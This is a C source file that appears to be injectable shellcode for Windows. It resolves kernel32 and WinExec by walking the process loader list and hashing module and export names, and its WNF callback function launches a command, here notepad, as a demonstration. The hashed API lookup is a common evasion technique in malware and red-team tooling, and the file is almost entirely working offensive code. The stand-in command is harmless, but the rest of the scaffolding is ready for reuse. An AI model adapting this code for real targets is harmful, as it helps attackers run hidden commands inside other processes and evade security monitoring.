#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winnt.h>
#include <winternl.h>

//
// Windows Definitions
//
typedef struct _WNF_STATE_NAME
{
    ULONG Data[2];
} WNF_STATE_NAME, * PWNF_STATE_NAME;

typedef ULONG WNF_CHANGE_STAMP, * PWNF_CHANGE_STAMP;

typedef struct _WNF_TYPE_ID
{
    GUID TypeId;
} WNF_TYPE_ID, * PWNF_TYPE_ID;

typedef UINT(WINAPI* WinExec_t)(
    LPCSTR lpCmdLine,
    UINT   uCmdShow);

//
// Known Hash Definitions
//
#define KERNEL32_HASH 0x6A4ABC5B // Uppercase Unicode
#define WINEXEC_HASH 0x0D88F668  // Uppercase ASCII

//
// Function Definitions
//
DWORD CalcAnsiStringHash(ULONG_PTR pAnsiString)
{
    DWORD hash = 0;

    while (*(UCHAR*)pAnsiString)
    {
        hash = ((hash >> 13 | hash << (32 - 13)) & 0xFFFFFFFF);

        if (*((CHAR*)pAnsiString) > 0x60)
            hash += *((CHAR*)pAnsiString) - 0x20;
        else
            hash += *((CHAR*)pAnsiString);

        pAnsiString++;
    }

    return hash;
}


DWORD CalcUnicodeStringHash(PUNICODE_STRING pUnicodeString)
{
    DWORD hash = 0;

    for (DWORD index = 0; index < pUnicodeString->Length; index++)
    {
        hash = ((hash >> 13 | hash << (32 - 13)) & 0xFFFFFFFF);

        if (((CHAR*)pUnicodeString->Buffer)[index] > 0x60)
            hash += ((CHAR*)pUnicodeString->Buffer)[index] - 0x20;
        else
            hash += ((CHAR*)pUnicodeString->Buffer)[index];
    }

    return hash;
}


ULONG_PTR GetModuleHandleByHash(DWORD moduleHash)
{
    ULONG_PTR hModule = 0;

#ifdef _M_ARM64
    PPEB_LDR_DATA pLdrData = (PPEB_LDR_DATA)(*(PULONG_PTR)(*(ULONG_PTR*)(__getReg(18) + 0x60) + 0x18));
    PLDR_DATA_TABLE_ENTRY pLdrDataTable = (PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)pLdrData->InMemoryOrderModuleList.Flink - 0x10);
#elif _WIN64
    PPEB_LDR_DATA pLdrData = (PPEB_LDR_DATA)(*(PULONG_PTR)((ULONG_PTR)__readgsqword(0x60) + 0x18));
    PLDR_DATA_TABLE_ENTRY pLdrDataTable = (PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)pLdrData->InMemoryOrderModuleList.Flink - 0x10);
#else
    PPEB_LDR_DATA pLdrData = (PPEB_LDR_DATA)(*(PULONG_PTR)((ULONG_PTR)__readfsdword(0x30) + 0xC));
    PLDR_DATA_TABLE_ENTRY pLdrDataTable = (PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)pLdrData->InMemoryOrderModuleList.Flink - 0x8);
#endif

    while (pLdrDataTable->DllBase != NULL)
    {
#ifdef _WIN64
        PUNICODE_STRING pBaseDllName = (PUNICODE_STRING)((ULONG_PTR)pLdrDataTable + 0x58);
#else
        PUNICODE_STRING pBaseDllName = (PUNICODE_STRING)((ULONG_PTR)pLdrDataTable + 0x2C);
#endif

        if (CalcUnicodeStringHash(pBaseDllName) == moduleHash)
        {
            hModule = (ULONG_PTR)pLdrDataTable->DllBase;
            break;
        }

#ifdef _WIN64
        pLdrDataTable = (PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)pLdrDataTable->InMemoryOrderLinks.Flink - 0x10);
#else
        pLdrDataTable = (PLDR_DATA_TABLE_ENTRY)((ULONG_PTR)pLdrDataTable->InMemoryOrderLinks.Flink - 0x8);
#endif
    }

    return hModule;
}


ULONG_PTR GetProcAddressByHash(ULONG_PTR hModule, DWORD procHash)
{
    ULONG_PTR pProc = 0;
    DWORD e_lfanew = *(DWORD*)(hModule + 0x3C);

#ifdef _WIN64
    DWORD nExportDirectoryOffset = *(DWORD*)(hModule + e_lfanew + 0x88);
#else
    DWORD nExportDirectoryOffset = *(DWORD*)(hModule + e_lfanew + 0x78);
#endif

    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(hModule + nExportDirectoryOffset);

    for (DWORD index = 0; index < pExportDirectory->NumberOfNames; index++)
    {
        ULONG_PTR pName = hModule + (ULONG_PTR)(*(DWORD*)(hModule + pExportDirectory->AddressOfNames + ((ULONG_PTR)index * 4)));

        if (CalcAnsiStringHash(pName) == procHash)
        {
            DWORD nOrdinal = (DWORD)(*(SHORT*)(hModule + pExportDirectory->AddressOfNameOrdinals + ((ULONG_PTR)index * 2)));
            pProc = (ULONG_PTR)hModule + (ULONG_PTR)(*(DWORD*)(hModule + pExportDirectory->AddressOfFunctions + ((ULONG_PTR)nOrdinal * 4)));
            break;
        }
    }

    return pProc;
}


NTSTATUS NTAPI WnfCallback(
    _In_ WNF_STATE_NAME StateName,
    _In_ WNF_CHANGE_STAMP ChangeStamp,
    _In_ PWNF_TYPE_ID TypeId,
    _In_opt_ PVOID CallbackContext,
    _In_ PVOID Buffer,
    _In_ ULONG BufferSize)
{
    ULONG64 cmdline[1] = { *(ULONG64*)"notepad\0" };
    ULONG_PTR pKernel32 = GetModuleHandleByHash(KERNEL32_HASH);
    ULONG_PTR pWinExec = GetProcAddressByHash(pKernel32, WINEXEC_HASH);

    return (NTSTATUS)((WinExec_t)pWinExec)((LPCSTR)cmdline, SW_SHOW);
}